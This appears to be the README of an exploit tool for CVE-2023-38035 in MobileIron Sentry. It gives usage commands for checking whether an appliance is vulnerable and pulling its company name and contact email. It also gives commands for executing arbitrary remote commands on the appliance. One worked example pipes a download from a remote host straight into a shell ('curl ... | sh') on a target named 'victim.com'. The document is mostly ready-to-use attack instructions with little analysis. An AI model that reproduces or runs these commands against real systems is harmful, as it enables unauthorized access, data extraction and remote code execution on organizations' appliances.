# MobileIron Sentry CVE-2023-38035 Information Extraction and Exploitation

This tool identifies and exploits the CVE-2023-38035 vulnerability in MobileIron Sentry to extract information and potentially execute commands.

## Features

- **Information Extraction**: Quickly retrieve company name and contact email from the vulnerable appliance.
- **Command Execution**: Utilize the exploit to execute remote commands on the vulnerable target.
- **Proof of Vulnerability**: Shows that the appliance is susceptible to the CVE in question.

## Usage

First, ensure that you've compiled the tool. Use it as follows:

### Information Extraction:

```sh
./main -target <TARGET>:<PORT>
```

Example:

```sh
./main -target victim.com:443
```

Output:

```
=============== SENTRY ===============
[+] https://victim.com:443 is vulnerable to CVE-2023-38035.
Company:  Victim Enterprise
Contact:  example@victim.com
```

### Command Execution:

To execute a command on the vulnerable target:

```sh
go run main.go -mode exploit -target <TARGET>:<PORT> -cmd "Your_Command_Here"
```

For instance:

```sh
go run main.go -mode exploit -target victim.com:443 -cmd "curl http://blabla | sh"
```

Output:

```
=============== SENTRY ===============
[+] Command executed successfully.
```

## Flags

- `-cmd`: Specify a command to execute.
- `-mode`: Set the mode of operation. It can be `check` (for information extraction) or `exploit` (to execute a command). Default is `check`.
- `-target`: Provide the target in format: IP, IP:port, or protocol://IP:port.

## Sources

For an in-depth understanding of the vulnerability, check out this [Horizon3 deep dive](https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive/).
